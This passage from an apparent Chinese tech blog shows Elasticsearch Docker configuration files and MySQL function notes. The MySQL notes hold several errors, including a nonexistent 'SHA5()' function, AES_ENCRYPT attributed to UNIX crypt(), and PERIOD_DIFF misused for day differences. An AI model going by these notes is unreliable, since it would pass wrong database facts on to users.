    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> elasticsearch<span class="token punctuation">-</span>standalone
    <span class="token key atrule">privileged</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always
    <span class="token key atrule">environment</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> TZ=Asia/Shanghai
      <span class="token punctuation">-</span> cluster.name=elasticsearch<span class="token punctuation">-</span>standalone
      <span class="token punctuation">-</span> node.name=node01
      <span class="token punctuation">-</span> cluster.initial_master_nodes=<span class="token punctuation">[</span><span class="token string">"node01"</span><span class="token punctuation">]</span>

    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>
      <span class="token comment"># - /opt/docker_data/elasticsearch-standalone/config/elasticsearch.keystore:/usr/share/elasticsearch/config/elasticsearch.keystore</span>
      <span class="token punctuation">-</span> /opt/docker_data/elasticsearch<span class="token punctuation">-</span>standalone/config/elasticsearch.yml<span class="token punctuation">:</span>/usr/share/elasticsearch/config/elasticsearch.yml
      <span class="token punctuation">-</span> /opt/docker_data/elasticsearch<span class="token punctuation">-</span>standalone/config/log4j2.properties<span class="token punctuation">:</span>/usr/share/elasticsearch/config/log4j2.properties
      <span class="token punctuation">-</span> /opt/docker_data/elasticsearch<span class="token punctuation">-</span>standalone/config/jvm.options<span class="token punctuation">:</span>/usr/share/elasticsearch/config/jvm.options
      <span class="token comment"># - /opt/docker_data/elasticsearch-standalone/config/role_mapping.yml:/usr/share/elasticsearch/config/role_mapping</span>
      <span class="token comment"># - /opt/docker_data/elasticsearch-standalone/config/roles.yml:/usr/share/elasticsearch/config/roles</span>
      <span class="token comment"># - /opt/docker_data/elasticsearch-standalone/config/users:/usr/share/elasticsearch/config/users</span>
      <span class="token comment"># - /opt/docker_data/elasticsearch-standalone/config/users_roles:/usr/share/elasticsearch/config/users_roles</span>
      <span class="token punctuation">-</span> /opt/docker_data/elasticsearch<span class="token punctuation">-</span>standalone/data<span class="token punctuation">:</span>/usr/share/elasticsearch/data
      <span class="token punctuation">-</span> /opt/docker_data/elasticsearch<span class="token punctuation">-</span>standalone/logs<span class="token punctuation">:</span>/usr/share/elasticsearch/logs
    <span class="token key atrule">ports</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> 9200<span class="token punctuation">:</span><span class="token number">9200</span>
      <span class="token punctuation">-</span> 9300<span class="token punctuation">:</span><span class="token number">9300</span>
    <span class="token key atrule">ulimits</span><span class="token punctuation">:</span>
      <span class="token key atrule">memlock</span><span class="token punctuation">:</span>
        <span class="token key atrule">soft</span><span class="token punctuation">:</span> <span class="token number">-1</span>
        <span class="token key atrule">hard</span><span class="token punctuation">:</span> <span class="token number">-1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>​         其中的配置文件：</p>
<ul>
<li>elasticsearch.yml</li>
</ul>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">node.master</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
<span class="token key atrule">node.data</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
<span class="token key atrule">bootstrap.memory_lock</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
<span class="token key atrule">network.host</span><span class="token punctuation">:</span> 0.0.0.0
<span class="token key atrule">http.port</span><span class="token punctuation">:</span> <span class="token number">9200</span>
<span class="token key atrule">transport.tcp.port</span><span class="token punctuation">:</span> <span class="token number">9300</span>


<span class="token key atrule">path.data</span><span class="token punctuation">:</span> /usr/share/elasticsearch/data  
<span class="token key atrule">path.logs</span><span class="token punctuation">:</span> /usr/share/elasticsearch/logs    

<span class="token key atrule">http.cors.enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
<span class="token key atrule">http.cors.allow-origin</span><span class="token punctuation">:</span> <span class="token string">"*"</span>
<span class="token key atrule">http.cors.allow-headers</span><span class="token punctuation">:</span> Authorization
<span class="token key atrule">xpack.security.enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
<span class="token key atrule">xpack.security.transport.ssl.enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>

<span class="token key atrule">discovery.zen.ping_timeout</span><span class="token punctuation">:</span> 120s
<span class="token key atrule">client.transport.ping_timeout</span><span class="token punctuation">:</span> 60s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>jvm.options</li>
</ul>
<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token comment">	## JVM configuration</span>

<span class="token comment">################################################################</span>
<span class="token comment">## IMPORTANT: JVM heap size</span>
<span class="token comment">################################################################</span>
<span class="token comment">##</span>
<span class="token comment">## You should always set the min and max JVM heap</span>
<span class="token comment">## size to the same value. For example, to set</span>
<span class="token comment">## the heap to 4 GB, set:</span>
<span class="token comment">##</span>
<span class="token comment">## -Xms4g</span>
<span class="token comment">## -Xmx4g</span>
<span class="token comment">##</span>
<span class="token comment">## See https://www.elastic.co/guide/en/elasticsearch/reference/current/heap-size.html</span>
<span class="token comment">## for more information</span>
<span class="token comment">##</span>
<span class="token comment">################################################################</span>

<span class="token comment"># Xms represents the initial size of total heap space</span>
<span class="token comment"># Xmx represents the maximum size of total heap space</span>

-Xms2g
-Xmx2g

<span class="token comment">################################################################</span>
<span class="token comment">## Expert settings</span>
<span class="token comment">################################################################</span>
<span class="token comment">##</span>
<span class="token comment">## All settings below this section are considered</span>
<span class="token comment">## expert settings. Don't tamper with them unless</span>
<span class="token comment">## you understand what you are doing</span>
<span class="token comment">##</span>
<span class="token comment">################################################################</span>

<span class="token comment">## GC configuration</span>
<span class="token key attr-name">-XX</span><span class="token punctuation">:</span><span class="token value attr-value">+UseConcMarkSweepGC</span>
<span class="token key attr-name">-XX</span><span class="token punctuation">:</span><span class="token value attr-value">CMSInitiatingOccupancyFraction=75</span>
<span class="token key attr-name">-XX</span><span class="token punctuation">:</span><span class="token value attr-value">+UseCMSInitiatingOccupancyOnly</span>

<span class="token comment">## G1GC Configuration</span>
<span class="token comment"># NOTE: G1GC is only supported on JDK version 10 or later.</span>
<span class="token comment"># To use G1GC uncomment the lines below.</span>
<span class="token comment"># 10-:-XX:-UseConcMarkSweepGC</span>
<span class="token comment"># 10-:-XX:-UseCMSInitiatingOccupancyOnly</span>
<span class="token comment"># 10-:-XX:+UseG1GC</span>
<span class="token comment"># 10-:-XX:InitiatingHeapOccupancyPercent=75</span>

<span class="token comment">## DNS cache policy</span>
<span class="token comment"># cache ttl in seconds for positive DNS lookups noting that this overrides the</span>
<span class="token comment"># JDK security property networkaddress.cache.ttl; set to -1 to cache forever</span>
<span class="token key attr-name">-Des.networkaddress.cache.ttl</span><span class="token punctuation">=</span><span class="token value attr-value">60</span>
<span class="token comment"># cache ttl in seconds for negative DNS lookups noting that this overrides the</span>
<span class="token comment"># JDK security property networkaddress.cache.negative ttl; set to -1 to cache</span>
<span class="token comment"># forever</span>
<span class="token key attr-name">-Des.networkaddress.cache.negative.ttl</span><span class="token punctuation">=</span><span class="token value attr-value">10</span>

<span class="token comment">## optimizations</span>

<span class="token comment"># pre-touch memory pages used by the JVM during initialization</span>
<span class="token key attr-name">-XX</span><span class="token punctuation">:</span><span class="token value attr-value">+AlwaysPreTouch</span>

<span class="token comment">## basic</span>

<span class="token comment"># explicitly set the stack size</span>
-Xss1m

<span class="token comment"># set to headless, just in case</span>
<span class="token key attr-name">-Djava.awt.headless</span><span class="token punctuation">=</span><span class="token value attr-value">true</span>

<span class="token comment"># ensure UTF-8 encoding by default (e.g. filenames)</span>
<span class="token key attr-name">-Dfile.encoding</span><span class="token punctuation">=</span><span class="token value attr-value">UTF-8</span>

<span class="token comment"># use our provided JNA always versus the system one</span>
<span class="token key attr-name">-Djna.nosys</span><span class="token punctuation">=</span><span class="token value attr-value">true</span>

<span class="token comment"># turn off a JDK optimization that throws away stack traces for common</span>
<span class="token comment"># exceptions because stack traces are important for debugging</span>
<span class="token key attr-name">-XX</span><span class="token punctuation">:</span><span class="token value attr-value">-OmitStackTraceInFastThrow</span>

<span class="token comment"># flags to configure Netty</span>
<span class="token key attr-name">-Dio.netty.noUnsafe</span><span class="token punctuation">=</span><span class="token value attr-value">true</span>
<span class="token key attr-name">-Dio.netty.noKeySetOptimization</span><span class="token punctuation">=</span><span class="token value attr-value">true</span>
<span class="token key attr-name">-Dio.netty.recycler.maxCapacityPerThread</span><span class="token punctuation">=</span><span class="token value attr-value">0</span>

<span class="token comment"># log4j 2</span>
<span class="token key attr-name">-Dlog4j.shutdownHookEnabled</span><span class="token punctuation">=</span><span class="token value attr-value">false</span>
<span class="token key attr-name">-Dlog4j2.disable.jmx</span><span class="token punctuation">=</span><span class="token value attr-value">true</span>

<span class="token key attr-name">-Djava.io.tmpdir</span><span class="token punctuation">=</span><span class="token value attr-value">${ES_TMPDIR}</span>

<span class="token comment">## heap dumps</span>

<span class="token comment"># generate a heap dump when an allocation from the Java heap fails</span>
<span class="token comment"># heap dumps are created in the working directory of the JVM</span>
<span class="token key attr-name">-XX</span><span class="token punctuation">:</span><span class="token value attr-value">+HeapDumpOnOutOfMemoryError</span>

<span class="token comment"># specify an alternative path for heap dumps; ensure the directory exists and</span>
<span class="token comment"># has sufficient space</span>
<span class="token key attr-name">-XX</span><span class="token punctuation">:</span><span class="token value attr-value">HeapDumpPath=data</span>

<span class="token comment"># specify an alternative path for JVM fatal error logs</span>
<span class="token key attr-name">-XX</span><span class="token punctuation">:</span><span class="token value attr-value">ErrorFile=logs/hs_err_pid%p.log</span>

<span class="token comment">## JDK 8 GC logging</span>

<span class="token key attr-name">8</span><span class="token punctuation">:</span><span class="token value attr-value">-XX:+PrintGCDetails</span>
<span class="token key attr-name">8</span><span class="token punctuation">:</span><span class="token value attr-value">-XX:+PrintGCDateStamps</span>
<span class="token key attr-name">8</span><span class="token punctuation">:</span><span class="token value attr-value">-XX:+PrintTenuringDistribution</span>
<span class="token key attr-name">8</span><span class="token punctuation">:</span><span class="token value attr-value">-XX:+PrintGCApplicationStoppedTime</span>
<span class="token key attr-name">8</span><span class="token punctuation">:</span><span class="token value attr-value">-Xloggc:logs/gc.log</span>
<span class="token key attr-name">8</span><span class="token punctuation">:</span><span class="token value attr-value">-XX:+UseGCLogFileRotation</span>
<span class="token key attr-name">8</span><span class="token punctuation">:</span><span class="token value attr-value">-XX:NumberOfGCLogFiles=32</span>
<span class="token key attr-name">8</span><span class="token punctuation">:</span><span class="token value attr-value">-XX:GCLogFileSize=64m</span>

<span class="token comment"># JDK 9+ GC logging</span>
<span class="token key attr-name">9-</span><span class="token punctuation">:</span><span class="token value attr-value">-Xlog:gc*,gc+age=trace,safepoint:file=logs/gc.log:utctime,pid,tags:filecount=32,filesize=64m</span>
<span class="token comment"># due to internationalization enhancements in JDK 9 Elasticsearch need to set the provider to COMPAT otherwise</span>
<span class="token comment"># time/date parsing will break in an incompatible way for some date patterns and locals</span>
<span class="token key attr-name">9-</span><span class="token punctuation">:</span><span class="token value attr-value">-Djava.locale.providers=COMPAT</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>log4j2.properties</li>
</ul>
<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token key attr-name">status</span> <span class="token punctuation">=</span> <span class="token value attr-value">error</span>

<span class="token comment"># log action execution errors for easier debugging</span>
<span class="token key attr-name">logger.action.name</span> <span class="token punctuation">=</span> <span class="token value attr-value">org.elasticsearch.action</span>
<span class="token key attr-name">logger.action.level</span> <span class="token punctuation">=</span> <span class="token value attr-value">debug</span>

<span class="token key attr-name">appender.rolling.type</span> <span class="token punctuation">=</span> <span class="token value attr-value">Console</span>
<span class="token key attr-name">appender.rolling.name</span> <span class="token punctuation">=</span> <span class="token value attr-value">rolling</span>
<span class="token key attr-name">appender.rolling.layout.type</span> <span class="token punctuation">=</span> <span class="token value attr-value">ESJsonLayout</span>
<span class="token key attr-name">appender.rolling.layout.type_name</span> <span class="token punctuation">=</span> <span class="token value attr-value">server</span>

<span class="token key attr-name">rootLogger.level</span> <span class="token punctuation">=</span> <span class="token value attr-value">info</span>
<span class="token key attr-name">rootLogger.appenderRef.rolling.ref</span> <span class="token punctuation">=</span> <span class="token value attr-value">rolling</span>

<span class="token key attr-name">appender.deprecation_rolling.type</span> <span class="token punctuation">=</span> <span class="token value attr-value">Console</span>
<span class="token key attr-name">appender.deprecation_rolling.name</span> <span class="token punctuation">=</span> <span class="token value attr-value">deprecation_rolling</span>
<span class="token key attr-name">appender.deprecation_rolling.layout.type</span> <span class="token punctuation">=</span> <span class="token value attr-value">ESJsonLayout</span>
<span class="token key attr-name">appender.deprecation_rolling.layout.type_name</span> <span class="token punctuation">=</span> <span class="token value attr-value">deprecation</span>

<span class="token key attr-name">logger.deprecation.name</span> <span class="token punctuation">=</span> <span class="token value attr-value">org.elasticsearch.deprecation</span>
<span class="token key attr-name">logger.deprecation.level</span> <span class="token punctuation">=</span> <span class="token value attr-value">warn</span>
<span class="token key attr-name">logger.deprecation.appenderRef.deprecation_rolling.ref</span> <span class="token punctuation">=</span> <span class="token value attr-value">deprecation_rolling</span>
<span class="token key attr-name">logger.deprecation.additivity</span> <span class="token punctuation">=</span> <span class="token value attr-value">false</span>

<span class="token key attr-name">appender.index_search_slowlog_rolling.type</span> <span class="token punctuation">=</span> <span class="token value attr-value">Console</span>
<span class="token key attr-name">appender.index_search_slowlog_rolling.name</span> <span class="token punctuation">=</span> <span class="token value attr-value">index_search_slowlog_rolling</span>
<span class="token key attr-name">appender.index_search_slowlog_rolling.layout.type</span> <span class="token punctuation">=</span> <span class="token value attr-value">ESJsonLayout</span>
<span class="token key attr-name">appender.index_search_slowlog_rolling.layout.type_name</span> <span class="token punctuation">=</span> <span class="token value attr-value">index_search_slowlog</span>

<span class="token key attr-name">logger.index_search_slowlog_rolling.name</span> <span class="token punctuation">=</span> <span class="token value attr-value">index.search.slowlog</span>
<span class="token key attr-name">logger.index_search_slowlog_rolling.level</span> <span class="token punctuation">=</span> <span class="token value attr-value">trace</span>
<span class="token key attr-name">logger.index_search_slowlog_rolling.appenderRef.index_search_slowlog_rolling.ref</span> <span class="token punctuation">=</span> <span class="token value attr-value">index_search_slowlog_rolling</span>
<span class="token key attr-name">logger.index_search_slowlog_rolling.additivity</span> <span class="token punctuation">=</span> <span class="token value attr-value">false</span>

<span class="token key attr-name">appender.index_indexing_slowlog_rolling.type</span> <span class="token punctuation">=</span> <span class="token value attr-value">Console</span>
<span class="token key attr-name">appender.index_indexing_slowlog_rolling.name</span> <span class="token punctuation">=</span> <span class="token value attr-value">index_indexing_slowlog_rolling</span>
<span class="token key attr-name">appender.index_indexing_slowlog_rolling.layout.type</span> <span class="token punctuation">=</span> <span class="token value attr-value">ESJsonLayout</span>
<span class="token key attr-name">appender.index_indexing_slowlog_rolling.layout.type_name</span> <span class="token punctuation">=</span> <span class="token value attr-value">index_indexing_slowlog</span>

<span class="token key attr-name">logger.index_indexing_slowlog.name</span> <span class="token punctuation">=</span> <span class="token value attr-value">index.indexing.slowlog.index</span>
<span class="token key attr-name">logger.index_indexing_slowlog.level</span> <span class="token punctuation">=</span> <span class="token value attr-value">trace</span>
<span class="token key attr-name">logger.index_indexing_slowlog.appenderRef.index_indexing_slowlog_rolling.ref</span> <span class="token punctuation">=</span> <span class="token value attr-value">index_indexing_slowlog_rolling</span>
<span class="token key attr-name">logger.index_indexing_slowlog.additivity</span> <span class="token punctuation">=</span> <span class="token value attr-value">false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="初始化密码">初始化密码</h3>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">进入elasticsearch容器

<span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> elasticsearch <span class="token function">bash</span>

进入bin目录

<span class="token builtin class-name">cd</span> bin/

执行初始化密码

./elasticsearch-setup-passwords interactive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>ElasticSearch</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL基础</title>
    <url>/20221031/bce68613.html</url>
    <content><![CDATA[<h1>字段加密/解密</h1>
<ol>
<li>
<p>PASSWORD(明文)：</p>
<p>创建一个经过加密的密码字符串，适合于插入到MySQL的安全系统。该加密过程不可逆，和unix密码加密过程使用不同的算法。主要用于MySQL的认证系统。</p>
</li>
<li>
<p>AES_ENCRYPT(明文，加密串)  AES_DECRYPT( 密文, 加密串 )</p>
<p>使用UNIX crypt()系统加密字符串，AES_ENCRYPT()函数接收要加密的字符串和（可选的）用于加密过程的salt（一个可以唯一确定口令的字符串，就像钥匙一样）。加密程度比ENCODE较强。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">举例：

加密
  <span class="token keyword">SELECT</span> HEX<span class="token punctuation">(</span>AES_ENCRYPT<span class="token punctuation">(</span><span class="token string">'测试'</span><span class="token punctuation">,</span> <span class="token string">'29a70b6c'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> DUAL<span class="token punctuation">;</span> 
  输出：AFA3016D4EE259FE76D0D625F9BDF889
  
解密
  <span class="token keyword">SELECT</span> <span class="token keyword">CONVERT</span><span class="token punctuation">(</span>AES_DECRYPT<span class="token punctuation">(</span>UNHEX<span class="token punctuation">(</span><span class="token string">'AFA3016D4EE259FE76D0D625F9BDF889'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'29a70b6c'</span><span class="token punctuation">)</span> <span class="token keyword">USING</span> utf8<span class="token punctuation">)</span> <span class="token keyword">FROM</span> DUAL<span class="token punctuation">;</span>
  输出：测试 （<span class="token keyword">CONVERT</span>，字符集转换）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>ENCODE(明文, 加密串)  DECODE(密文, 加密串)<br>
加密解密字符串。该函数有两个参数：被加密或解密的字符串和作为加密或解密基础的密钥。Encode结果是一个二进制字符串，以BLOB类型存储。加密成度相对比较弱。</p>
</li>
<li>
<p>MD5()：计算字符串的MD5校验和（128位），</p>
</li>
<li>
<p>SHA5()：计算字符串的SHA5校验和（160位）</p>
<p>MD5()、SHA5() 这两个函数返回的校验和是16进制的，适合与认证系统中使用的口令。</p>
</li>
</ol>
<h1>CONCAT函数</h1>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">注意：和<span class="token boolean">NULL</span>连接的结果为<span class="token boolean">NULL</span>

<span class="token keyword">SELECT</span> CONCAT<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> DUAL<span class="token punctuation">;</span> 返回：test<span class="token operator">-</span><span class="token number">1</span>
<span class="token keyword">SELECT</span> CONCAT<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">,</span> <span class="token boolean">NULL</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> DUAL<span class="token punctuation">;</span> 返回：<span class="token boolean">NULL</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h1>IP地址/Long数据</h1>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> INET_ATON<span class="token punctuation">(</span><span class="token string">'112.253.20.48'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token number">1895633968</span>
<span class="token keyword">SELECT</span> INET_NTOA<span class="token punctuation">(</span><span class="token string">'1895633968'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token number">112.253</span><span class="token number">.20</span><span class="token number">.48</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h1>日期函数</h1>
<h2 id="date-format参数">date_format参数</h2>
<table>
<thead>
<tr>
<th>参数（年）</th>
<th></th>
<th>参数（月）</th>
<th></th>
<th>参数（日）</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>%Y</td>
<td>年，4 位</td>
<td>%b</td>
<td>缩写月名</td>
<td>%D</td>
<td>带有英文前缀的月中的天</td>
</tr>
<tr>
<td>%y</td>
<td>年，2 位</td>
<td>%c</td>
<td>月份的数值（1-12）</td>
<td>%d</td>
<td>月的天，数值(00-31)</td>
</tr>
<tr>
<td></td>
<td></td>
<td>%M</td>
<td>月名</td>
<td>%e</td>
<td>月的天，数值(0-31)</td>
</tr>
<tr>
<td></td>
<td></td>
<td>%m</td>
<td>月，数值(01-12)</td>
<td>%j</td>
<td>年的天 (001-366)</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>参数（时间）</th>
<th></th>
<th>参数（时）</th>
<th></th>
<th>参数（分）</th>
<th></th>
<th>参数（秒）</th>
<th></th>
<th>参数（微秒）</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>%T</td>
<td>时间，24-小时 (hh:mm:ss)</td>
<td>%H</td>
<td>小时 (00-23)</td>
<td>%i</td>
<td>分钟，数值(00-59)</td>
<td>%S</td>
<td>或者 %s 秒(00-59)</td>
<td>%f</td>
<td>微秒</td>
</tr>
<tr>
<td>%r</td>
<td>时间，12-小时（hh:mm:ss AM 或 PM）</td>
<td>%h</td>
<td>小时 (01-12)</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>%p</td>
<td>AM 或 PM</td>
<td>%I</td>
<td>小时 (01-12)</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>%k</td>
<td>小时 (0-23)</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>参数（年天）</th>
<th></th>
<th>参数（周天）</th>
<th></th>
<th>参数（星期）</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>%X</td>
<td>年，其中的星期日是周的第一天，4 位，与 %V 使用</td>
<td>%U</td>
<td>年周 (00-53) 星期日是一周的第一天</td>
<td>%a</td>
<td>缩写星期名</td>
</tr>
<tr>
<td>%x</td>
<td>年，其中的星期一是周的第一天，4 位，与 %v 使用</td>
<td>%u</td>
<td>年周 (00-53) 星期一是一周的第一天</td>
<td>%W</td>
<td>星期名</td>
</tr>
<tr>
<td></td>
<td></td>
<td>%V</td>
<td>年周 (01-53) 星期日是一周的第一天，与 %X 使用</td>
<td>%w</td>
<td>周的天 （0=星期日, 6=星期六）</td>
</tr>
<tr>
<td></td>
<td></td>
<td>%v</td>
<td>年周 (01-53) 星期一是一周的第一天，与 %x 使用</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>函数</th>
<th>举例</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>CURDATE()  <br>CURRENT_DATE()</td>
<td>SELECT CURDATE()<br> 2021-11-30</td>
<td>返回当前的日期（%Y-%m-%d）</td>
</tr>
<tr>
<td>CURTIME()  <br>CURRENT_TIME()</td>
<td>SELECT CURTIME();<br>18:34:12</td>
<td>返回当前的时间（%T或者%H:%i:%s）</td>
</tr>
<tr>
<td><strong>DATE_ADD(date,INTERVAL expr unit)</strong></td>
<td>SELECT DATE_ADD(CURRENT_DATE,INTERVAL 6 MONTH);<br>2022-05-30</td>
<td>返回日期date加上间隔时间int的结果<br>(int必须按照关键字进行格式化)</td>
</tr>
<tr>
<td><strong>DATE_SUB(date,INTERVAL int keyword)</strong></td>
<td>SELECT DATE_SUB( CURRENT_DATE, INTERVAL 6 MONTH );<br>2021-05-30</td>
<td>返回日期date加上间隔时间int的结果<br>(int必须按照关键字进行格式化)</td>
</tr>
<tr>
<td><strong>PERIOD_DIFF(P1, P2)</strong></td>
<td># 月份差值<br>SELECT PERIOD_DIFF(date_format(‘2021-09-30’, ‘%Y%m’), date_format(‘2021-06-20’, ‘%Y%m’))<br><br>#天数差值<br>SELECT PERIOD_DIFF(date_format(‘2021-09-30’, ‘%Y%m%d’), date_format(‘2021-06-20’, ‘%Y%m%d’))<br><br># 上一个月<br> SELECT * FROM 表名 WHERE PERIOD_DIFF(date_format(now(),‘%Y%m’),date_format(时间字段名,‘%Y%m’) =1</td>
<td>计算两个日期之间的差值</td>
</tr>
<tr>
<td>TO_DAYS(date)</td>
<td># 今天<br>SELECT * FROM 表名 WHERE TO_DAYS(时间字段名) =TO_DAYS(NOW());<br><br> # 昨天<br>SELECT * FROM 表名 WHERE TO_DAYS(NOW()) - TO_DAYS( 时间字段名) &lt;= 1</td>
<td>日期转天数</td>
</tr>
<tr>
<td>YEARWEEK</td>
<td>SELECT YEARWEEK(now()) <br>返回：202148<br><br># 本周<br>SELECT * FROM 表名 WHERE YEARWEEK( date_format( 时间字段名,‘%Y-%m-%d’ ) ) = YEARWEEK( now() ) ;</td>
<td></td>
</tr>
<tr>
<td>WEEK</td>
<td></td>
<td>返回日期date为一年中第几周(0~53)</td>
</tr>
<tr>
<td>DAYOFWEEK</td>
<td></td>
<td>返回date所代表的一星期中的第几天(1~7)</td>
</tr>
<tr>
<td>DAYOFMONTH</td>
<td></td>
<td>返回date是一个月的第几天(1~31)</td>
</tr>
<tr>
<td>DAYOFYEAR(date)</td>
<td></td>
<td>返回date是一年的第几天(1~366)</td>
</tr>
<tr>
<td>DAYNAME</td>
<td>SELECT DAYNAME(CURRENT_DATE);<br>返回：Tuesday</td>
<td>返回date的星期名</td>
</tr>
<tr>
<td>FROM_UNIXTIME(ts,fmt)</td>
<td></td>
<td>根据指定的fmt格式，格式化UNIX时间戳ts</td>
</tr>
<tr>
<td>YEAR</td>
<td># 本年<br> SELECT * FROM 表名 WHERE YEAR( 时间字段名 ) = YEAR( NOW( ) )</td>
<td></td>
</tr>
<tr>
<td>MONTH</td>
<td></td>
<td>返回date的月份(1~12)</td>
</tr>
<tr>
<td>MONTHNAME</td>
<td></td>
<td>返回date的月份名</td>
</tr>
<tr>
<td>HOUR</td>
<td></td>
<td>返回time的小时值(0~23)</td>
</tr>
<tr>
<td>MINUTE</td>
<td></td>
<td>返回time的分钟值(0~59)</td>
</tr>
<tr>
<td>QUARTER</td>
<td>SELECT QUARTER(CURRENT_DATE);<br>返回：4</td>
<td>返回date在一年中的季度(1~4)</td>
</tr>
</tbody>
</table>
<h1>MySQL外键设置</h1>
<p>MySQL外键设置: Cascade、NO ACTION、Restrict、SET NULL</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>cascade</td>
<td>在父表上update/delete记录时，同步update/delete掉子表的匹配记录</td>
</tr>
<tr>
<td>set null</td>
<td>在父表上update/delete记录时，将子表上匹配记录的列设为null，要注意子表的外键列不能为not null</td>
</tr>
<tr>
<td>No action</td>
<td>如果子表中有匹配的记录,则不允许对父表对应候选键进行update/delete操作</td>
</tr>
<tr>
<td>Restrict</td>
<td>同no action, 都是立即检查外键约束</td>
</tr>
<tr>
<td>Set default</td>
<td>父表有变更时,子表将外键列设置成一个默认的值 但Innodb不能识别</td>
</tr>
</tbody>
</table>
<h1>查看/修改系统参数</h1>
<h2 id="版本号">版本号</h2>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 查看的是innodb_version</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="查看数据库运行中的进程">查看数据库运行中的进程</h2>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> <span class="token keyword">full</span> processlist  或
